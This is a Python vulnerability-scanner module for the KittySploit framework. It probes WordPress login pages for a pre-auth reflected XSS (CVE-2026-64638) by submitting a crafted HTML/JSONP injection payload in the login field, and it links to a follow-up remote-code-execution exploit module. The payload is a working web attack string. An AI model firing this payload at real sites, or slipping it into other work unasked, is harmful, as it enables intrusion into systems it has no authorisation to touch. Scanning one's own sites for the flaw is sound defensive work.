#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect WordPress Core CVE-2026-64638 XSS2Shell parser differential."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

CVE_ID = "CVE-2026-64638"
PATCHED_VERSION = "7.0.3"

PAYLOAD = (
    "< area id=ajaxurl href=/?rest_route=/&_method=GET"
    "&_jsonp=window.opener.approve.click&_envelope=1>"
    "< div id=color-picker class=reset-pass-submit>"
    '< button class="wp-generate-pw color-option">X'
)

MARKERS = ('id="ajaxurl"', 'id="color-picker"')


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress Core CVE-2026-64638 XSS2Shell Detect",
        "description": (
            "Detects CVE-2026-64638 in WordPress Core 4.7.0 through 7.0.2: "
            "pre-auth reflected XSS via strip_tags/KSES parser differential on "
            "/wp-login.php. Fixed in 7.0.3 and backports."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": [CVE_ID],
        "references": [
            f"https://nvd.nist.gov/vuln/detail/{CVE_ID}",
            f"https://www.cve.org/CVERecord?id={CVE_ID}",
        ],
        "modules": ["exploits/multi/http/wp_xss2shell_cve_2026_64638_rce"],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "wp-core",
            "xss",
            "xss2shell",
            "rce",
            "cve-2026-64638",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "chain": {
                "produces_capabilities": ["xss", "rce"],
                "suggested_followups": [
                    "exploits/multi/http/wp_xss2shell_cve_2026_64638_rce",
                ],
            },
        },
    }

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(getattr(self, "path", "/"))

    def _login_path(self) -> str:
        root = self._wp_base()
        return f"{root}/wp-login.php" if root != "/" else "/wp-login.php"

    def _post_login(self) -> str:
        response = self.http_request(
            method="POST",
            path=self._login_path(),
            data={
                "log": PAYLOAD,
                "pwd": "x",
                "wp-submit": "Log In",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=True,
            timeout=int(self.timeout or 15),
        )
        return (response.text or "") if response else ""

    def _probe_markers(self, body: str):
        hits = [marker for marker in MARKERS if marker in (body or "")]
        if hits:
            return True, "XSS confirmed - injected " + " ".join(hits) + " rendered as live markup"
        if "login_error" in (body or ""):
            return False, "payload reflected but escaped (patched)"
        return False, "no login error notice in response (unexpected)"

    def run(self):
        try:
            body = self._post_login()
        except Exception as exc:
            print_status(f"Probe failed: {exc.__class__.__name__}")
            return False

        ok, evidence = self._probe_markers(body)
        if ok:
            severity = "critical"
            reason = evidence
            vulnerable = True
        elif "login_error" in body:
            severity = "info"
            reason = (
                f"Payload reflected but escaped — patched for {CVE_ID} "
                f"(>= {PATCHED_VERSION})"
            )
            vulnerable = False
        else:
            severity = "info"
            reason = evidence
            vulnerable = False

        print_status(f"{CVE_ID} probe vuln={vulnerable} — {reason}")
        self.set_info(
            severity=severity,
            reason=reason,
            vulnerable=vulnerable,
            cve=CVE_ID,
        )
        return True
